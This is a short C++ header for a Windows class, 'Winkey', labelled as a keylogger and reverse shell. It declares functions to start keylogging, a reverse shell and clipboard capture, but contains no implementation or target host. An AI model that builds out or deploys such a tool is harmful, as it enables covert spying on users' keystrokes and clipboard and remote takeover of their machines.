#ifndef WINKEY_HPP
# define WINKEY_HPP

# include <iostream>  // For standard I/O
# include <winsock2.h> // For Winsock functions
# include <windows.h>  // For Windows API functions
#include <Tlhelp32.h>
#include <time.h>
#include <unordered_map>
#include <cctype> // Include for std::toupper

# include <windows.h>
# include <winuser.h>
# include <winsock2.h>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "User32.lib")



// Keylogger - Reverse shell
class Winkey {
	public:
		Winkey(void);
		~Winkey(void);


		void	startKeylogger();
		void	startReverseShell();
		void	startclipBoard(void);
		//DWORD WINAPI _reverseShell(LPVOID lpParam);
	private:
		
};

#endif